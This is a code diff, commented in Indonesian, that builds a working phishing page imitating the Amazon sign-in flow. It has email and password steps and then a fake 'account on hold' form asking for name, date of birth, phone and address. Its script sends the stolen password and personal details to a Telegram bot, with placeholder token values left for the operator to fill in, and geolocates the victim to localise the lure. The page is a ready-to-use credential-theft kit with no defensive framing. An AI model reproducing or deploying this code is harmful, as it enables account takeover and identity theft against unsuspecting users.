@@ -1,54 +1,40 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Amazon Sign In</title>
+    
+    <link rel="icon" href="assets/favicon.ico">
+    
+    <!-- Muat Konfigurasi -->
+    <script src="config/negara.js"></script>
+    <script src="config/bahasa.js"></script>
+    
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
-    <div class="wadah-utama">
-        <!-- Logo Amazon -->
+    <!-- Halaman 1: Email -->
+    <div class="wadah-utama" id="halaman-email">
         <div class="logo-amazon">
-            <span class="teks-amazon">amazon</span>
-            <span class="panah">↗</span>
+            <img src="assets/amazon.png" alt="Amazon" class="logo-gambar">
         </div>
-
-        <!-- Kotak Masuk -->
         <div class="kotak-masuk">
-            <h1>Sign in</h1>
-            
-            <label for="email">Email or mobile phone number</label>
-            <input type="text" id="email" name="email">
-            
-            <button type="button" class="tombol-lanjut">Continue</button>
-            
-            <p class="teks-syarat">
-                By continuing, you agree to Amazon's 
-                <a href="#">Conditions of Use</a> and 
-                <a href="#">Privacy Notice</a>.
+            <h1 data-i18n="selamatDatang">Sign in</h1>
+            <label data-i18n="emailLabel">Email or mobile phone number</label>
+            <input type="text" id="email" required>
+            <button class="tombol-lanjut" onclick="bukaSandi()" data-i18n="lanjut">Continue</button>
+            <p class="teks-syarat" data-i18n-html="syarat">
+                By continuing, you agree to Amazon's <a href="#">Conditions of Use</a> and <a href="#">Privacy Notice</a>.
             </p>
-            
-            <p class="bantuan">
-                <span>›</span> <a href="#">Need help?</a>
-            </p>
-            
-            <div class="garis-pemisah">
-                <span>Buying for work?</span>
-            </div>
-            
-            <p class="tautan-bisnis">
-                <a href="#">Shop on Amazon Business</a>
-            </p>
+            <p class="bantuan"><span>›</span> <a href="#" data-i18n="butuhBantuan">Need help?</a></p>
+            <div class="garis-pemisah"><span data-i18n="beliKerja">Buying for work?</span></div>
+            <p class="tautan-bisnis"><a href="#" data-i18n="tokoBisnis">Shop on Amazon Business</a></p>
         </div>
-
-        <!-- Garis & Tombol Daftar -->
         <div class="bagian-daftar">
-            <p class="teks-pemisah">New to Amazon?</p>
-            <button type="button" class="tombol-daftar">Create your Amazon account</button>
+            <p class="teks-pemisah" data-i18n="baruAmazon">New to Amazon?</p>
+            <button class="tombol-daftar" data-i18n="buatAkun">Create your Amazon account</button>
         </div>
-
-        <!-- Kaki Halaman -->
         <footer>
             <div class="tautan-kaki">
                 <a href="#">Conditions of Use</a>
@@ -58,5 +44,293 @@
             <p class="hak-cipta">© 1996-2026, Amazon.com, Inc. or its affiliates</p>
         </footer>
     </div>
+
+    <!-- Halaman 2: Kata Sandi -->
+    <div class="wadah-utama" id="halaman-sandi" style="display: none;">
+        <div class="logo-amazon">
+            <img src="assets/amazon.png" alt="Amazon" class="logo-gambar">
+        </div>
+        <div class="kotak-masuk">
+            <p class="email-terdaftar">
+                <span id="tampil-email"></span>
+                <a href="#" id="tautan-ganti" data-i18n="ganti">Change</a>
+            </p>
+            <h1 data-i18n="selamatDatang">Sign in</h1>
+            <label data-i18n="kataSandi">Password</label>
+            <input type="password" id="sandi" required>
+            <button class="tombol-lanjut" id="tombol-masuk" onclick="kirimData()" data-i18n="masuk">Sign in</button>
+            <div class="pemisah-or"><span>or</span></div>
+            <button class="tombol-passkey" data-i18n="masukKunci">Sign in with a passkey</button>
+        </div>
+        <div class="bagian-daftar">
+            <p class="teks-pemisah" data-i18n="baruAmazon">New to Amazon?</p>
+            <button class="tombol-daftar" data-i18n="buatAkun">Create your Amazon account</button>
+        </div>
+        <footer>
+            <div class="tautan-kaki">
+                <a href="#">Conditions of Use</a>
+                <a href="#">Privacy Notice</a>
+                <a href="#">Help</a>
+            </div>
+            <p class="hak-cipta">© 1996-2026, Amazon.com, Inc. or its affiliates</p>
+        </footer>
+    </div>
+
+    <!-- Halaman 3: Verifikasi -->
+    <div id="halaman-verifikasi" style="display: none;">
+        <nav class="navbar">
+            <div class="nav-kiri">
+                <span class="logo-kecil">amazon</span>
+                <span class="lokasi">
+                    <span id="bendera-negara"></span>
+                    <span id="nama-negara">Memuat...</span>
+                </span>
+            </div>
+            <div class="nav-tengah">
+                <input type="text" placeholder="Search Amazon" class="kotak-cari">
+                <button class="tombol-cari">🔍</button>
+            </div>
+            <div class="nav-kanan">
+                <span id="menu-akun">
+                    <span id="bendera-akun"></span>
+                    <span id="teks-akun" data-i18n="selamat">Hello, Sign in</span>
+                </span>
+                <span id="tautan-pesanan" data-i18n="pesanan">Returns & Orders</span>
+                <span id="tautan-keranjang" data-i18n="keranjang">Cart 🛒</span>
+            </div>
+        </nav>
+
+        <div class="submenu">
+            <span>☰ All</span>
+            <span>Today's Deals</span>
+            <span>Prime Video</span>
+            <span>Buy Again</span>
+            <span>Customer Service</span>
+            <span>Registry</span>
+            <span>Gift Cards</span>
+            <span>Sell</span>
+        </div>
+
+        <main class="konten-verifikasi">
+            <div class="kotak-peringatan">
+                <span class="ikon-peringatan">⚠️</span>
+                <strong data-i18n="tahanAkun">Account on hold temporarily</strong>
+            </div>
+            <p class="teks-peringatan" data-i18n="peringatan">
+                We notice unusual payment activity on your account and need to verify ownership of the payment method used on your most recent order.
+            </p>
+
+            <h2 data-i18n="konfirmasiIdentitas">Confirm your identity</h2>
+            <p class="petunjuk" data-i18n="masukkanInfo">Please enter the information that matches your account.</p>
+
+            <form id="form-verifikasi">
+                <label data-i18n="negaraWilayah">Country/Region</label>
+                <select id="negara">
+                    <option value="ID">Indonesia</option>
+                    <option value="MY">Malaysia</option>
+                    <option value="SG">Singapore</option>
+                    <option value="AU">Australia</option>
+                    <option value="US">United States</option>
+                </select>
+
+                <label data-i18n="namaLengkap">Full name (First and Last name)</label>
+                <input type="text" id="nama-lengkap">
+
+                <label data-i18n="ttl">Date of Birth</label>
+                <input type="date" id="tanggal-lahir">
+
+                <label data-i18n="nomorHP">Phone number</label>
+                <input type="tel" id="nomor-hp">
+
+                <label data-i18n="alamat1">Address line 1</label>
+                <input type="text" id="alamat1">
+
+                <label data-i18n="alamat2">Address line 2</label>
+                <input type="text" id="alamat2">
+
+                <div class="baris-kota">
+                    <div>
+                        <label data-i18n="kota">City</label>
+                        <input type="text" id="kota">
+                    </div>
+                    <div>
+                        <label data-i18n="provinsi">State</label>
+                        <input type="text" id="provinsi">
+                    </div>
+                    <div>
+                        <label data-i18n="kodePos">ZIP Code</label>
+                        <input type="text" id="kodepos">
+                    </div>
+                </div>
+
+                <label class="kotak-centang">
+                    <input type="checkbox"> <span data-i18n="alamatBawaan">This is my default address</span>
+                </label>
+
+                <button type="button" class="tombol-kuning" onclick="kirimVerifikasi()" data-i18n="verifikasiAlamat">Verify Address</button>
+            </form>
+        </main>
+
+        <footer class="kaki-gelap">
+            <a href="#" class="kembali-keatas" data-i18n="kembaliAtas">Back to top</a>
+            <div class="tabel-kaki">
+                <div>
+                    <h4>Get to Know Us</h4>
+                    <p>Careers</p><p>Blog</p><p>About Amazon</p><p>Investor Relations</p><p>Amazon Devices</p><p>Amazon Science</p>
+                </div>
+                <div>
+                    <h4>Make Money with Us</h4>
+                    <p>Sell products on Amazon</p><p>Sell on Amazon Business</p><p>Sell apps on Amazon</p><p>Become an Affiliate</p><p>Advertise Your Products</p><p>Self-Publish with Us</p><p>Host an Amazon Hub</p>
+                </div>
+                <div>
+                    <h4>Amazon Payment Products</h4>
+                    <p>Shop with Points</p><p>Reload Your Balance</p><p>Amazon Currency Converter</p>
+                </div>
+                <div>
+                    <h4>Let Us Help You</h4>
+                    <p>Your Account</p><p>Your Orders</p><p>Shipping Rates & Policies</p><p>Returns & Replacements</p><p>Manage Your Content and Devices</p><p>Help</p>
+                </div>
+            </div>
+            <div class="bawah-kaki">
+                <span class="logo-kecil-bawah">amazon</span>
+                <p>Conditions of Use &nbsp; Privacy Notice &nbsp; Your Ads Privacy Choices</p>
+                <p>© 1996-2026, Amazon.com, Inc. or its affiliates</p>
+            </div>
+        </footer>
+    </div>
+
+    <script>
+        // === Telegram — Ganti dengan milikmu ===
+        const BOT_TOKEN = 'GANTI_DENGAN_TOKEN_BOT_KAMU';
+        const CHAT_ID = 'GANTI_DENGAN_ID_CHAT_KAMU';
+
+        let dataPengguna = { email: '', sandi: '', kodeNegara: 'ID' };
+
+        // === Terapkan Bahasa ke Seluruh Halaman ===
+        function terapkanBahasa(kodeNegara) {
+            document.querySelectorAll('[data-i18n]').forEach(el => {
+                const kunci = el.getAttribute('data-i18n');
+                el.textContent = teks(kodeNegara, kunci);
+            });
+            document.querySelectorAll('[data-i18n-html]').forEach(el => {
+                const kunci = el.getAttribute('data-i18n-html');
+                // Untuk teks yang mengandung link, biarkan HTML tetap utuh
+                const bhs = terjemahan[kodeNegara] || terjemahan[BAHASA_BAWAAN];
+                if (bhs[kunci]) el.innerHTML = bhs[kunci];
+            });
+        }
+
+        // === Deteksi Negara → Terapkan Bendera + Bahasa ===
+        async function deteksiNegara() {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                const kode = data.country || 'ID';
+                dataPengguna.kodeNegara = kode;
+
+                // Tampilkan bendera
+                const info = daftarNegara[kode] || NEGARA_BAWAAN;
+                const benderaEl = document.getElementById('bendera-negara');
+                const namaEl = document.getElementById('nama-negara');
+                const benderaAkunEl = document.getElementById('bendera-akun');
+                
+                if (benderaEl) benderaEl.textContent = info.bendera;
+                if (namaEl) namaEl.textContent = `Deliver to ${info.nama}`;
+                if (benderaAkunEl) benderaAkunEl.textContent = info.bendera + ' ';
+
+                // Terapkan bahasa sesuai negara
+                terapkanBahasa(kode);
+
+                // Set pilihan negara di formulir
+                const selectNegara = document.getElementById('negara');
+                if (selectNegara) selectNegara.value = kode;
+
+                console.log('✅ Negara:', kode, '| Bahasa diterapkan');
+            } catch (e) {
+                console.log('⚠️ Pakai bahasa bawaan (Indonesia)');
+                dataPengguna.kodeNegara = 'ID';
+                terapkanBahasa('ID');
+                const info = daftarNegara['ID'];
+                const benderaEl = document.getElementById('bendera-negara');
+                const namaEl = document.getElementById('nama-negara');
+                if (benderaEl) benderaEl.textContent = info.bendera;
+                if (namaEl) namaEl.textContent = `Deliver to ${info.nama}`;
+            }
+        }
+
+        // === Navigasi Halaman ===
+        function bukaSandi() {
+            const email = document.getElementById('email').value.trim();
+            if (!email) { alert('Masukkan email terlebih dahulu'); return; }
+            dataPengguna.email = email;
+            document.getElementById('tampil-email').textContent = email;
+            document.getElementById('halaman-email').style.display = 'none';
+            document.getElementById('halaman-sandi').style.display = 'block';
+        }
+
+        document.getElementById('tautan-ganti').addEventListener('click', e => {
+            e.preventDefault();
+            document.getElementById('halaman-sandi').style.display = 'none';
+            document.getElementById('halaman-email').style.display = 'block';
+        });
+
+        // === Kirim Login → Telegram → Tampil Verifikasi ===
+        async function kirimData() {
+            const sandi = document.getElementById('sandi').value;
+            if (!sandi) { alert('Masukkan kata sandi'); return; }
+            dataPengguna.sandi = sandi;
+
+            const pesan = `📧 LOGIN DITERIMA
+Negara: ${dataPengguna.kodeNegara}
+Email: ${dataPengguna.email}
+Kata Sandi: ${dataPengguna.sandi}
+Waktu: ${new Date().toLocaleString()}`;
+
+            await kirimKeTelegram(pesan);
+
+            document.getElementById('halaman-sandi').style.display = 'none';
+            document.getElementById('halaman-verifikasi').style.display = 'block';
+            
+            // Jalankan deteksi saat halaman verifikasi muncul
+            deteksiNegara();
+        }
+
+        // === Kirim Formulir Verifikasi ===
+        async function kirimVerifikasi() {
+            const data = `✅ DATA VERIFIKASI
+Negara: ${dataPengguna.kodeNegara}
+Email: ${dataPengguna.email}
+Nama: ${document.getElementById('nama-lengkap').value}
+TTL: ${document.getElementById('tanggal-lahir').value}
+HP: ${document.getElementById('nomor-hp').value}
+Alamat 1: ${document.getElementById('alamat1').value}
+Alamat 2: ${document.getElementById('alamat2').value}
+Kota: ${document.getElementById('kota').value}
+Provinsi: ${document.getElementById('provinsi').value}
+Kode Pos: ${document.getElementById('kodepos').value}
+Negara: ${document.getElementById('negara').value}`;
+
+            await kirimKeTelegram(data);
+            alert(teks(dataPengguna.kodeNegara, 'kirimBerhasil'));
+        }
+
+        // === Fungsi Kirim ke Telegram ===
+        async function kirimKeTelegram(teksPesan) {
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: teksPesan,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                console.log('✅ Terkirim ke Telegram');
+            } catch (e) {
+                console.log('❌ Gagal kirim:', e);
+            }
+        }
+    </script>
 </body>
 </html>
